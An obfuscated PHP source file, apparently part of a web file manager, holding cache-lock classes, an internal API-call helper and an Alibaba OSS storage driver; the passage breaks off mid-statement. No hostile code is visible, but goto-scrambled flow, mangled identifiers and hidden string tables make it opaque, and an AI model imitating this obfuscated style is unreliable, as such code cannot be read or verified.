<?php
 goto CÏìæ®÷Ş¥; däËÊ«Ş: class CacheLockMemcached { public function lock($c’†Ö™éá, $dƒºÅ½‡Š = 0) { $F„ÙÑ÷À = Cache::init(); $bƒ¥Âœ‹è = microtime(!0) + $dƒºÅ½‡Š; while (microtime(!0) < $bƒ¥Âœ‹è) { $C¶åÙ­Ò¢ = $F„ÙÑ÷À->get($c’†Ö™éá); if (!$C¶åÙ­Ò¢ || $C¶åÙ­Ò¢ < microtime(!0)) { $bˆÍ¤œÄ›ë = $F„ÙÑ÷À->handle->add($c’†Ö™éá, $bƒ¥Âœ‹è, $dƒºÅ½‡Š); if ($bˆÍ¤œÄ›ë) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C„´ÑÙÃ´) { return Cache::init()->get($C„´ÑÙÃ´); } public function unlock($A‰›âğ) { return Cache::init()->remove($A‰›âğ); } } class CacheLockDatabase { public function lock($FñÇôøî±ˆ, $Cå‡ŠÀÒó­ = 0) { $dÃ‡†ùÁæÀ = Model($_SERVER[÷ÖêïÔÔÓ][751]); $fŒİà˜›ÕÉ = microtime(!0) + $Cå‡ŠÀÒó­; while (microtime(!0) < $fŒİà˜›ÕÉ) { $aâ±ãéï¦ = $dÃ‡†ùÁæÀ->get($FñÇôøî±ˆ); if (!$aâ±ãéï¦ || $aâ±ãéï¦ < microtime(!0)) { $Cª‘˜ÀëÓº = $dÃ‡†ùÁæÀ->set($FñÇôøî±ˆ, $fŒİà˜›ÕÉ); if ($Cª‘˜ÀëÓº) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($B ŞÁˆµí½) { return Model($_SERVER[÷ÖêïÔÔÓ][751])->get($B ŞÁˆµí½); } public function unlock($aƒ©£ñ¢Ñ¦) { Model($_SERVER[÷ÖêïÔÔÓ][751])->remove($aƒ©£ñ¢Ñ¦); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dõÎÇÚÜî½, $cÃé—Ó®¥‡) { $D´¾‚®ìœ÷ =& $_SERVER[÷ÖêïÔÔÓ]; if (!class_exists($D´¾‚®ìœ÷[771])) { show_json($D´¾‚®ìœ÷[772], !1); } $this->cacheTime = $cÃé—Ó®¥‡; $this->handle = new Memcached(); if (is_array($dõÎÇÚÜî½[$D´¾‚®ìœ÷[773]]) && count($dõÎÇÚÜî½[$D´¾‚®ìœ÷[773]]) >= 1) { foreach ($dõÎÇÚÜî½[$D´¾‚®ìœ÷[773]] as $a”œ±ÙÑ”‚) { $fäˆç¼æ˜× = explode($D´¾‚®ìœ÷[4], $a”œ±ÙÑ”‚); $this->handle->addServer($fäˆç¼æ˜×[0], $fäˆç¼æ˜×[1]); } } else { $this->handle->addServer($dõÎÇÚÜî½[$D´¾‚®ìœ÷[166]], $dõÎÇÚÜî½[$D´¾‚®ìœ÷[167]]); } } public function set($f‡ƒêÆİ», $C¿°ÆÉ½ä•, $B»áÇ¼É‚ = false) { $B»áÇ¼É‚ = $B»áÇ¼É‚ ? $B»áÇ¼É‚ : $this->cacheTime; return $this->handle->set($f‡ƒêÆİ», $C¿°ÆÉ½ä•, $B»áÇ¼É‚); } public function get($cŸ ˆ³Š¨) { return $this->handle->get($cŸ ˆ³Š¨); } public function remove($B¾ÒŸ£ºø) { return $this->handle->delete($B¾ÒŸ£ºø); } public function deleteAll() { return $this->handle->flush(); } } goto EÅËãïÛáæ; d§íª·–Ó±: function ActionCall($fßäœÍ½Ù„) { $c §¯ñ‘¦ë = array_slice(func_get_args(), 1); return ActionApply($fßäœÍ½Ù„, $c §¯ñ‘¦ë); } function ActionCallApi($C²âÜÈˆĞ™, $eÇƒ®ÃÅ†É = '') { goto DÆ¸òÎíÓ; CŸÃŠÀéÙ«: return $aÔœªÛ’¸ç; goto BçÂ»ª²‹â; d¶´ª¹×È£: $CÖÚàÜğƒŠ = phpBinCommand(); if ($CÖÚàÜğƒŠ && function_exists($dƒšåËöª‹[25])) { $Dßö•ßâ = $CÖÚàÜğƒŠ . $dƒšåËöª‹[26] . BASIC_PATH . $dƒšåËöª‹[27] . escapeshellarg($C²âÜÈˆĞ™); $bÙîÕÆˆ‚¢ = shell_exec($Dßö•ßâ); } if (!$bÙîÕÆˆ‚¢) { $AÓÍÜŠØ¶à = stream_context_create(array($dƒšåËöª‹[28] => array($dƒšåËöª‹[29] => 20, $dƒšåËöª‹[30] => $dƒšåËöª‹[31]))); $bÙîÕÆˆ‚¢ = file_get_contents(app_host_get() . $C²âÜÈˆĞ™, !1, $AÓÍÜŠØ¶à); } goto cÎ¿×ˆÙª‚; DÆ¸òÎíÓ: $dƒšåËöª‹ =& $_SERVER[Óº‹‘Î]; $Fñ•ÕŒ¢Ù‰ = $eÇƒ®ÃÅ†É; if (is_array($eÇƒ®ÃÅ†É)) { $Fñ•ÕŒ¢Ù‰ = $dƒšåËöª‹[20]; foreach ($eÇƒ®ÃÅ†É as $E§›ÎÍ®Íì => $d‘øÛ‰™Œ”) { $d‘øÛ‰™Œ” = is_array($d‘øÛ‰™Œ”) ? json_encode($d‘øÛ‰™Œ”) : $d‘øÛ‰™Œ”; $d‘øÛ‰™Œ” = is_bool($d‘øÛ‰™Œ”) ? intval($d‘øÛ‰™Œ”) : $d‘øÛ‰™Œ”; $Fñ•ÕŒ¢Ù‰ .= $dƒšåËöª‹[21] . $E§›ÎÍ®Íì . $dƒšåËöª‹[22] . rawurlencode($d‘øÛ‰™Œ”); } } goto c¾ÛÅŸ·ë; cÎ¿×ˆÙª‚: $e“ÃÛÍáÀê = json_decode($bÙîÕÆˆ‚¢, !0); $aÔœªÛ’¸ç = is_array($e“ÃÛÍáÀê) ? $e“ÃÛÍáÀê : array($dƒšåËöª‹[32] => null, $dƒšåËöª‹[33] => $bÙîÕÆˆ‚¢); if (!$e“ÃÛÍáÀê) { echo $bÙîÕÆˆ‚¢; } goto CŸÃŠÀéÙ«; c¾ÛÅŸ·ë: $CÏŒ‘ñ¾¨ù = Action($dƒšåËöª‹[23])->accessToken(); $C²âÜÈˆĞ™ = str_replace($dƒšåËöª‹[5], $dƒšåËöª‹[4], $C²âÜÈˆĞ™) . $dƒšåËöª‹[24] . $CÏŒ‘ñ¾¨ù . $Fñ•ÕŒ¢Ù‰; $bÙîÕÆˆ‚¢ = $dƒšåËöª‹[20]; goto d¶´ª¹×È£; BçÂ»ª²‹â: } function ActionCallHook($bÌ„İ†ØÜ¾) { goto C‘òœ–Ê°²; eáÒŠ°·Òì: $DóïÜí„£‰ = $CôÕéÊíœ» ? json_decode($CôÕéÊíœ», !0) : $DóïÜí„£‰; $GLOBALS[$cÀ½ç¡˜ìÄ[34]] = 0; return $DóïÜí„£‰; goto AÄ¼¯ï¼„; C‘òœ–Ê°²: $cÀ½ç¡˜ìÄ =& $_SERVER[Óº‹‘Î]; ob_start(); $Bñçî—Œ­ = array_slice(func_get_args(), 1); goto C’ˆèÎ¥Š; C’ˆèÎ¥Š: $GLOBALS[$cÀ½ç¡˜ìÄ[34]] = 1; $DóïÜí„£‰ = ActionApply($bÌ„İ†ØÜ¾, $Bñçî—Œ­); $CôÕéÊíœ» = ob_get_clean(); goto eáÒŠ°·Òì; AÄ¼¯ï¼„: } goto B¶µ¼å©ãØ; aÏïìôÁ£§: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($DÌÖ´©é) { parent::__construct($DÌÖ´©é); $this->signatureVersion($_SERVER[÷ÖêïÔÔÓ][197]); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public function __construct($Có®Ñ“ÁÏ¯) { parent::__construct(); include_once SDK_DIR . $_SERVER[÷ÖêïÔÔÓ][1130]; $this->_init($Có®Ñ“ÁÏ¯); } public function _init($eÂÆ…‡—•) { foreach ($eÂÆ…‡—• as $CË”¼½¹ˆš => $d®»–÷åÊ) { if (isset($this->{$CË”¼½¹ˆš})) { $this->{$CË”¼½¹ˆš} = $d®»–÷åÊ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[÷ÖêïÔÔÓ][1131], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto d©Ç²è‡«¡; d©Ç²è‡«¡: $A»µÌª§›â =& $_SERVER[÷ÖêïÔÔÓ]; $Dº†Ÿ‹‚ğ = new OSS\Model\CorsConfig(); $d‹«ªŠ¼Å¤ = new OSS\Model\CorsRule(); goto f ÖôèÂßˆ; Dáë–°˜íİ: $d‹«ªŠ¼Å¤->setMaxAgeSeconds(600); $d‹«ªŠ¼Å¤->addExposeHeader($A»µÌª§›â[1137]); $d‹«ªŠ¼Å¤->addAllowedHeader($A»µÌª§›â[1132]); goto bÑÂ¦„¯š; e¡óÃ Ô«: $d‹«ªŠ¼Å¤->addAllowedMethod($A»µÌª§›â[1135]); $d‹«ªŠ¼Å¤->addAllowedMethod($A»µÌª§›â[1136]); $d‹«ªŠ¼Å¤->addAllowedMethod($A»µÌª§›â[150]); goto Dáë–°˜íİ; bÑÂ¦„¯š: $Dº†Ÿ‹‚ğ->addRule($d‹«ªŠ¼Å¤); try { $this->client->putBucketCors($this->bucket, $Dº†Ÿ‹‚ğ); } catch (OSS\Core\OssException $B•õ˜“¡Á) { return !1; } return !0; goto fö¢Ø¶§Š; f ÖôèÂßˆ: $d‹«ªŠ¼Å¤->addAllowedOrigin($A»µÌª§›â[1132]); $d‹«ªŠ¼Å¤->addAllowedMethod($A»µÌª§›â[1133]); $d‹«ªŠ¼Å¤->addAllowedMethod($A»µÌª§›â[1134]); goto e¡óÃ Ô«; fö¢Ø¶§Š: } public function getBucketCors() { goto dÊ¼¼Ì¨ó; eÎáÇ‚‡Ö: if (!$Bœ·êè¹ƒß || !($A¨¼¾¢ëŒ… = $Bœ·êè¹ƒß->getRules())) { return null; } $CÎ÷õºÛÀ = $A¨¼¾¢ëŒ…[0]->getAllowedOrigins(); $C­„ŠôÕ = $A¨¼¾¢ëŒ…[0]->getAllowedMethods(); goto a­‡÷Ü¥í¨; a­‡÷Ü¥í¨: $Dœ‚ÇÌ…ê = $A¨¼¾¢ëŒ…[0]->getMaxAgeSeconds(); $aÈà­À¢¯÷ = $A¨¼¾¢ëŒ…[0]->getExposeHeaders(); $A“Ò¤»Ã†± = $A¨¼¾¢ëŒ…[0]->getAllowedHeaders(); goto eøØØñãØ¸; dÊ¼¼Ì¨ó: $c†ôŠ§áÊó =& $_SERVER[÷ÖêïÔÔÓ]; $Bœ·êè¹ƒß = null; try { $Bœ·êè¹ƒß = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $D¢¾¨ƒœÛ‡) { return null; } goto eÎáÇ‚‡Ö; eøØØñãØ¸: return array($c†ôŠ§áÊó[172] => isset($CÎ÷õºÛÀ[0]) ? $CÎ÷õºÛÀ[0] : $c†ôŠ§áÊó[33], $c†ôŠ§áÊó[176] => $C­„ŠôÕ, $c†ôŠ§áÊó[1138] => $Dœ‚ÇÌ…ê, $c†ôŠ§áÊó[1139] => isset($aÈà­À¢¯÷[0]) ? $aÈà­À¢¯÷[0] : $c†ôŠ§áÊó[33], $c†ôŠ§áÊó[174] => isset($A“Ò¤»Ã†±[0]) ? $A“Ò¤»Ã†±[0] : $c†ôŠ§áÊó[33]); goto E£Ï×ÚäÙæ; E£Ï×ÚäÙæ: } public function isBucketCors() { goto a¡ìÉ¶Ï‚â; a¡ìÉ¶Ï‚â: $e•ˆ­Ê¥‰Ö =& $_SERVER[÷ÖêïÔÔÓ]; $Bä‹°®Ó”» = $this->getBucketCors(); if (!$Bä‹°®Ó”» || !is_array($Bä‹°®Ó”»)) { return !1; } goto aã¯–×Ïº»; C±ˆİŠÅ«: $e¥£óšˆË = array($e•ˆ­Ê¥‰Ö[177], $e•ˆ­Ê¥‰Ö[178], $e•ˆ­Ê¥‰Ö[179], $e•ˆ­Ê¥‰Ö[180], $e•ˆ­Ê¥‰Ö[181]); $cŞÒãµÆš© = array_diff($e¥£óšˆË, $fé­°½•ñ¡); return empty($cŞÒãµÆš©); goto fœÚ×Ô¸ö½; aã¯–×Ïº»: if ($Bä‹°®Ó”»[$e•ˆ­Ê¥‰Ö[172]] != $e•ˆ­Ê¥‰Ö[173] || $Bä‹°®Ó”»[$e•ˆ­Ê¥‰Ö[174]] != $e•ˆ­Ê¥‰Ö[173]) { return !1; } $fé­°½•ñ¡ = array_map($e•ˆ­Ê¥‰Ö[175], $Bä‹°®Ó”»[$e•ˆ­Ê¥‰Ö[176]]); if (!is_array($fé­°½•ñ¡)) { $fé­°½•ñ¡ = array(); } goto C±ˆİŠÅ«; fœÚ×Ô¸ö½: } public function mkfile($DÌ›ã·½¶», $fÊ¼”ÛÏ‰ì = '', $cËÊ°¨Ğò = REPEAT_RENAME) { $dóâòàğóâ = $this->setContent($DÌ›ã·½¶», $fÊ¼”ÛÏ‰ì); if ($dóâòàğóâ !== !1) { return $this->getPathOuter($DÌ›ã·½¶»); } return !1; } public function mkdir($D‡¶šöµ©, $bÖâ°Åçñ = REPEAT_SKIP) { if ($this->_isFolder($D‡¶šöµ©)) { return $this->getPathOuter($D‡¶šöµ©); } try { $this->client->createObjectDir($this->bucket, $D‡¶šöµ©); } catch (OSS\Core\OssException $Aœ÷ì™ñ“) { return !1; } return $this->getPathOuter($D‡¶šöµ©); } private function fileList($fÁïè³’ç, $A¸µÀ˜†¨‚ = '', $fë¡Ç“Éê = 0) { goto e›—°‹ß—; Cù¡ğ“ôäÍ: while (!0) { $FÒÉæ»ò½Á = array($C³¡İàÆ–­[1140] => $A¸µÀ˜†¨‚, $C³¡İàÆ–­[183] => $eİœÃì„³, $C³¡İàÆ–­[1141] => $f‹Á©»î–, $C³¡İàÆ–­[1142] => $eáÇ„¢§²); try { $dÌ³ˆÀ°±‹ = $this->client->listObjects($this->bucket, $FÒÉæ»ò½Á); } catch (OSS\Core\OssException $dÅššêŞÚ) { break; } $eáÇ„¢§² = $dÌ³ˆÀ°±‹->getNextMarker(); $DÃòÉ‡ëæ¾ = $dÌ³ˆÀ°±‹->getObjectList(); $B†¡ÚöôĞ = $dÌ³ˆÀ°±‹->getPrefixList(); foreach ($DÃòÉ‡ëæ¾ as $f˜£„Ÿª–) { if ($f˜£„Ÿª–->getKey() == $eİœÃì„³) { continue; } $CœÄ×İ‡¬â = $f˜£„Ÿª–->getKey(); if ($fë¡Ç“Éê) { $CœÄ×İ‡¬â = array($C³¡İàÆ–­[28] => $CœÄ×İ‡¬â, $C³¡İàÆ–­[78] => $f˜£„Ÿª–->getSize(), $C³¡İàÆ–­[187] => strtotime($f˜£„Ÿª–->getLastModified())); } $aËÖŒìãç[] = $CœÄ×İ‡¬â; } foreach ($B†¡ÚöôĞ as $F®—Ù¸ƒ‹÷) { $FÄĞ½ß‰Òà[] = $F®—Ù¸ƒ‹÷->getPrefix(); } if ($eáÇ„¢§² === $C³¡İàÆ–­[33]) { break; } } return array($C³¡İàÆ–­[75] => $FÄĞ½ß‰Òà, $C³¡İàÆ–­[74] => $aËÖŒìãç); goto fâğÓÀêˆ ; e›—°‹ß—: $C³¡İàÆ–­ =& $_SERVER[÷ÖêïÔÔÓ]; $fÁïè³’ç = trim($fÁïè³’ç, $C³¡İàÆ–­[8]); $eİœÃì„³ = empty($fÁïè³’ç) ? $C³¡İàÆ–­[33] : $fÁïè³’ç . $C³¡İàÆ–­[8]; goto eä§Ê¢İÉˆ; eä§Ê¢İÉˆ: $eáÇ„¢§² = $C³¡İàÆ–­[33]; $f‹Á©»î– = 1000; $FÄĞ½ß‰Òà = $aËÖŒìãç = array(); goto Cù¡ğ“ôäÍ; fâğÓÀêˆ : } public function copyFile($Bí„¯‘Ğß, $E²½¬·¡…£) { $FâÙÀÀ‡å° = $this->size($Bí„¯‘Ğß); if ($FâÙÀÀ‡å° < 1024 * 1024 * 1024) { try { $C¼¡„¼Á = $this->client->copyObject($this->bucket, $Bí„¯‘Ğß, $this->bucket, $E²½¬·¡…£); } catch (OSS\Core\OssException $A‘Ğ½¢á–†) { return !1; } return !0; } return $this->multiCopyObject($Bí„¯‘Ğß, $E²½¬·¡…£, $FâÙÀÀ‡å°); } private function multiCopyObject($EĞ®óš°ø, $BëÙ›øŞ¿Ü, $Dß’”ä…ä) { $AéİÈÜØ =& $_SERVER[÷ÖêïÔÔÓ]; try { goto dïÃ‡–áœ¤; dïÃ‡–áœ¤: $e†»ÚŒ¹Çñ = array(); if ($A‹ÍÁ¤‘ = $this->hashMd5($EĞ®óš°ø)) { $e†»ÚŒ¹Çñ = array(OSS\OssClient::OSS_HEADERS => array($AéİÈÜØ[1143] => $A‹ÍÁ¤‘)); } $C¸Ìæ·ØíĞ = $this->client->initiateMultipartUpload($this->bucket, $BëÙ›øŞ¿Ü, $e†»ÚŒ¹Çñ); goto cÚÑß¡×™¤; cÇÆÂ­´¢«: $b˜Â—âèïÌ = array(); foreach ($AŸôç·õÜØ as $AíĞõ»ÀÁ³ => $d˜ŞØùöŒî) { $b˜Â—âèïÌ[] = array($AéİÈÜØ[1147] => $AíĞõ»ÀÁ³ + 1, $AéİÈÜØ[1148] => $d˜ŞØùöŒî); } $EõÜ÷ÎÉ = $this->client->completeMultipartUpload($this->bucket, $BëÙ›øŞ¿Ü, $C¸Ìæ·ØíĞ, $b˜Â—âèïÌ); goto døæŠëÍ•®; déÔ… É²: $d¯§ÀÜğ¼Ï = $this->osChunkSize(); $bÓó ™ÈÔ = $this->client->generateMultiuploadParts($Dß’”ä…ä, $d¯§ÀÜğ¼Ï); foreach ($bÓó ™ÈÔ as $AíĞõ»ÀÁ³ => $Cö×´‚§—×) { $a½Úˆ×÷’À = $eÙ¤Ğß‚Ş¼ + (int) $Cö×´‚§—×[$AéİÈÜØ[1144]]; $d«Û£ä›”¦ = (int) $Cö×´‚§—×[$AéİÈÜØ[322]] + $a½Úˆ×÷’À - 1; $DğÛöÁéªÅ = array($AéİÈÜØ[1145] => $a½Úˆ×÷’À, $AéİÈÜØ[1146] => $d«Û£ä›”¦); $AŸôç·õÜØ[] = $this->client->uploadPartCopy($this->bucket, $EĞ®óš°ø, $this->bucket, $BëÙ›øŞ¿Ü, $d—× ©, $C¸Ìæ·ØíĞ, $DğÛöÁéªÅ); $d—× © = $d—× © + 1; } goto cÇÆÂ­´¢«; cÚÑß¡×™¤: $d—× © = 1; $eÙ¤Ğß‚Ş¼ = 0; $AŸôç·õÜØ = array(); goto déÔ… É²; døæŠëÍ•®: } catch (OSS\Core\OssException $cÂ¡Ñ‡–Ş‰) { return !1; } return !0; } public function moveFile($C‹”ÜªíÆí, $C©ÎÈàÊÄù) { if ($this->copyFile($C‹”ÜªíÆí, $C©ÎÈàÊÄù)) { $this->remove($C‹”ÜªíÆí); return !0; } return !1; } public function delFile($eÍ­ï¡á¹Å) { try { $this->client->deleteObject($this->bucket, $eÍ­ï¡á¹Å); } catch (OSS\Core\OssException $cĞö÷ÚˆÜÙ) { return !1; } return !0; } public function delFolder($fÖÓ…Äè Ş) { $DÁ… Ò„İ =& $_SERVER[÷ÖêïÔÔÓ]; $dÜŞ×ï¢Ö = $this->fileList($fÖÓ…Äè Ş); if (!empty($fÖÓ…Äè Ş) && !in_array(trim($fÖÓ…Äè Ş, $DÁ… Ò„İ[8]) . $DÁ… Ò„İ[8], $dÜŞ×ï¢Ö[$DÁ… Ò„İ[74]])) { $dÜŞ×ï¢Ö[$DÁ… Ò„İ[74]][] = trim($fÖÓ…Äè Ş, $DÁ… Ò„İ[8]) . $DÁ… Ò„İ[8]; } foreach (array_chunk($dÜŞ×ï¢Ö[$DÁ… Ò„İ[74]], 1000) as $d‡Ù¿êŸ†) { try { $this->client->deleteObjects($this->bucket, $d‡Ù¿êŸ†); } catch (OSS\Core\OssException $A´·‚ÃŸØ¾) { continue; } } return !0; } public function rename($dÚ´“Á¬ø, $b…”ÏÊÈç) { return $this->renameObject($dÚ´“Á¬ø, $b…”ÏÊÈç); } private function fileInfo($Dø›Ã»Ş‡È, $eïî§ïäíÃ = array()) { goto b…²áõÔğÃ; b…²áõÔğÃ: $bÑğÉ¿·¹¾ =& $_SERVER[÷ÖêïÔÔÓ]; $DğÁáˆ‡µ = array($bÑğÉ¿·¹¾[28] => $this->pathThis($Dø›Ã»Ş‡È), $bÑğÉ¿·¹¾[76] => $this->getPathOuter($Dø›Ã»Ş‡È), $bÑğÉ¿·¹¾[29] => $bÑğÉ¿·¹¾[164], $bÑğÉ¿·¹¾[184] => $bÑğÉ¿·¹¾[50], $bÑğÉ¿·¹¾[106] => $bÑğÉ¿·¹¾[50], $bÑğÉ¿·¹¾[78] => 0, $bÑğÉ¿·¹¾[157] => $this->ext($Dø›Ã»Ş‡È), $bÑğÉ¿·¹¾[185] => !0, $bÑğÉ¿·¹¾[186] => !0); if (empty($eïî§ïäíÃ)) { $fêÑ»Ê¬¼ = $this->objectMeta($Dø›Ã»Ş‡È); if (!$fêÑ»Ê¬¼) { return $DğÁáˆ‡µ; } $eïî§ïäíÃ = array($bÑğÉ¿·¹¾[106] => strtotime($fêÑ»Ê¬¼[$bÑğÉ¿·¹¾[1149]]), $bÑğÉ¿·¹¾[78] => $fêÑ»Ê¬¼[$bÑğÉ¿·¹¾[1150]] + 0); } goto dÇŞ¨÷©; fŸôß©®ßË: return $DğÁáˆ‡µ; goto bÎø©±—ñ; dÇŞ¨÷©: if (isset($eïî§ïäíÃ[$bÑğÉ¿·¹¾[78]])) { $DğÁáˆ‡µ[$bÑğÉ¿·¹¾[78]] = $eïî§ïäíÃ[$bÑğÉ¿·¹¾[78]]; } if (isset($eïî§ïäíÃ[$bÑğÉ¿·¹¾[106]])) { $DğÁáˆ‡µ[$bÑğÉ¿·¹¾[106]] = $eïî§ïäíÃ[$bÑğÉ¿·¹¾[106]]; } if (isset($eïî§ïäíÃ[$bÑğÉ¿·¹¾[187]]) && !trim($DğÁáˆ‡µ[$bÑğÉ¿·¹¾[106]])) { $DğÁáˆ‡µ[$bÑğÉ¿·¹¾[106]] = $eïî§ïäíÃ[$bÑğÉ¿·¹¾[187]]; } goto fŸôß©®ßË; bÎø©±—ñ: } private function folderInfo($c×…Çõ‘ì¡, $BŒêÜÃ¡¦ = array()) { $fˆ®¼öÃø¿ =& $_SERVER[÷ÖêïÔÔÓ]; $BªÒÏ¿Õö‚ = array($fˆ®¼öÃø¿[28] => $this->pathThis($c×…Çõ‘ì¡), $fˆ®¼öÃø¿[76] => $this->getPathOuter($fˆ®¼öÃø¿[8] . $c×…Çõ‘ì¡), $fˆ®¼öÃø¿[29] => $fˆ®¼öÃø¿[77], $fˆ®¼öÃø¿[184] => $fˆ®¼öÃø¿[50], $fˆ®¼öÃø¿[106] => $fˆ®¼öÃø¿[50], $fˆ®¼öÃø¿[185] => !0, $fˆ®¼öÃø¿[186] => !0); if (empty($BŒêÜÃ¡¦)) { $c×…Çõ‘ì¡ = rtrim($c×…Çõ‘ì¡, $fˆ®¼öÃø¿[8]) . $fˆ®¼öÃø¿[8]; $CÒ‚Ä“¼’ = $this->objectMeta($c×…Çõ‘ì¡); if (!$CÒ‚Ä“¼’) { return $BªÒÏ¿Õö‚; } $BŒêÜÃ¡¦ = array($fˆ®¼öÃø¿[184] => $CÒ‚Ä“¼’[$fˆ®¼öÃø¿[1151]][$fˆ®¼öÃø¿[1152]], $fˆ®¼öÃø¿[106] => strtotime($CÒ‚Ä“¼’[$fˆ®¼öÃø¿[1149]])); } if (isset($BŒêÜÃ¡¦[$fˆ®¼öÃø¿[106]])) { $BªÒÏ¿Õö‚[$fˆ®¼öÃø¿[106]] = $BŒêÜÃ¡¦[$fˆ®¼öÃø¿[106]]; } if (isset($BŒêÜÃ¡¦[$fˆ®¼öÃø¿[184]])) { $BªÒÏ¿Õö‚[$fˆ®¼öÃø¿[184]] = $BŒêÜÃ¡¦[$fˆ®¼öÃø¿[184]]; } return $BªÒÏ¿Õö‚; } public function listPath($A„î×óÔ´Ş, $eªÌØ°œ = false) { $AÒ­¾ÒéÑ¢ =& $_SERVER[÷ÖêïÔÔÓ]; $CÈëŞŒĞ®‡ = $this->fileList($A„î×óÔ´Ş, $AÒ­¾ÒéÑ¢[8], !0); foreach ($CÈëŞŒĞ®‡[$AÒ­¾ÒéÑ¢[75]] as $cœÎ¨­‘•½ => $dô°ÚøŸóè) { $CÈëŞŒĞ®‡[$AÒ­¾ÒéÑ¢[75]][$cœÎ¨­‘•½] = $this->folderInfo($dô°ÚøŸóè, $dô°ÚøŸóè); } foreach ($CÈëŞŒĞ®‡[$AÒ­¾ÒéÑ¢[74]] as $cœÎ¨­‘•½ => $dô°ÚøŸóè) { $CÈëŞŒĞ®‡[$AÒ­¾ÒéÑ¢[74]][$cœÎ¨­‘•½] = $this->fileInfo($dô°ÚøŸóè[$AÒ­¾ÒéÑ¢[28]], $dô°ÚøŸóè); } return $CÈëŞŒĞ®‡; } public function has($D×°œ÷‹±Ñ, $c÷â‹¡¦„¬ = false, $e½ÓùÍƒ³ğ = true) { goto D¿…çÀ½ˆç; e‹ÄÛÄ¯Í: $DƒŞÀ©ïÃº = 0; while (!0) { $E¡îºˆà‰è = array($CÀÁ–ßïÃ¬[1140] => $CÀÁ–ßïÃ¬[8], $CÀÁ–ßïÃ¬[183] => $fÒ£å²äƒŒ, $CÀÁ–ßïÃ¬[1141] => $f§À÷Ùä•ô, $CÀÁ–ßïÃ¬[1142] => $AÁĞëƒì); try { $CŸ®£‰×›¯ = $this->client->listObjects($this->bucket, $E¡îºˆà‰è); } catch (OSS\Core\OssException $AÎëíòÜÂ) { break; } $AÁĞëƒì = $CŸ®£‰×›¯->getNextMarker(); $CƒÛí‰Ãº³ = $CŸ®£‰×›¯->getObjectList(); $cÔá¹ğõç“ = $CŸ®£‰×›¯->getPrefixList(); if ($c÷â‹¡¦„¬) { if (count($CƒÛí‰Ãº³) > 1 || count($CƒÛí‰Ãº³) == 1 && $CƒÛí‰Ãº³[0]->getKey() != $fÒ£å²äƒŒ) { $a—•Ÿƒ¡† += count($CƒÛí‰Ãº³) - 1; } if (!empty($cÔá¹ğõç“)) { $DƒŞÀ©ïÃº += count($cÔá¹ğõç“); } if ($AÁĞëƒì === $CÀÁ–ßïÃ¬[33]) { break; } continue; } if ($e½ÓùÍƒ³ğ) { if (!empty($CƒÛí‰Ãº³)) { if (count($CƒÛí‰Ãº³) > 1 || $CƒÛí‰Ãº³[0]->getKey() != $fÒ£å²äƒŒ) { return !0; } } } else { if (!empty($cÔá¹ğõç“)) { return !0; } } if ($AÁĞëƒì === $CÀÁ–ßïÃ¬[33]) { break; } } if ($c÷â‹¡¦„¬) { return array($CÀÁ–ßïÃ¬[188] => $a—•Ÿƒ¡†, $CÀÁ–ßïÃ¬[189] => $DƒŞÀ©ïÃº); } goto dñäë…ÊÉ; dòßªë„ÕÍ: $AÁĞëƒì = $CÀÁ–ßïÃ¬[33]; $f§À÷Ùä•ô = 500; $a—•Ÿƒ¡† = 0; goto e‹ÄÛÄ¯Í; dñäë…ÊÉ: return !1; goto DÇİª¯»Çí; D¿…çÀ½ˆç: $CÀÁ–ßïÃ¬ =& $_SERVER[÷ÖêïÔÔÓ]; $D×°œ÷‹±Ñ = trim($D×°œ÷‹±Ñ, $CÀÁ–ßïÃ¬[8]); $fÒ£å²äƒŒ = empty($D×°œ÷‹±Ñ) ? $CÀÁ–ßïÃ¬[33] : $D×°œ÷‹±Ñ . $CÀÁ–ßïÃ¬[8]; goto dòßªë„ÕÍ; DÇİª¯»Çí: } public function listAll($B£„‡’»‚) { $Cœšë‰Îˆ =& $_SERVER[÷ÖêïÔÔÓ]; $a¶ßñ¥ÒœÀ = $this->fileList($B£„‡’»‚, $Cœšë‰Îˆ[33], !0); $C®Ş¸Íîîè = array(); foreach ($a¶ßñ¥ÒœÀ[$Cœšë‰Îˆ[74]] as $E£‚ô¹œºÁ) { $C®Ş¸Íîîè[$E£‚ô¹œºÁ[$Cœšë‰Îˆ[28]]] = $E£‚ô¹œºÁ[$Cœšë‰Îˆ[78]]; } return $this->listAllFiles($B£„‡’»‚, array_keys($C®Ş¸Íîîè), $C®Ş¸Íîîè); } public function canRead($eõ£ÜöÎ¤ö) { $Fè†‹×¸İÛ =& $_SERVER[÷ÖêïÔÔÓ]; $a¨¤ŠÂ‚ÀŒ = $this->pathAcl($eõ£ÜöÎ¤ö); return $a¨¤ŠÂ‚ÀŒ == $Fè†‹×¸İÛ[1153] || $a¨¤ŠÂ‚ÀŒ == $Fè†‹×¸İÛ[483] ? !0 : !1; } public function canWrite($D‹ø„ÇÆ¿Ã) { $B¢âò²ÏØÛ = $this->pathAcl($D‹ø„ÇÆ¿Ã); return $B¢âò²ÏØÛ == $_SERVER[÷ÖêïÔÔÓ][483] ? !0 : !1; } public function pathAcl($AšÍÓ¿¡Æ) { goto EÂ‰÷®ÁÀÚ; Eœ…Áø˜Ê: return $Fåª†æÛå‰; goto BÎõã§®‡Ÿ; dè³ğß„„: $Fåª†æÛå‰ = $eø¡ˆôÅÂ == $B¡ ï¹Ø•[34] ? $this->bucketAcl : $eø¡ˆôÅÂ; if ($Fåª†æÛå‰ == $B¡ ï¹Ø•[1154]) { return $B¡ ï¹Ø•[1153]; } if ($Fåª†æÛå‰ == $B¡ ï¹Ø•[1155]) { return $B¡ ï¹Ø•[483]; } goto Eœ…Áø˜Ê; EÂ‰÷®ÁÀÚ: $B¡ ï¹Ø• =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $eø¡ˆôÅÂ = $this->client->getObjectAcl($this->bucket, $AšÍÓ¿¡Æ); } catch (OSS\Core\OssException $Aº„¡‡²ÙŠ) { return !1; } goto 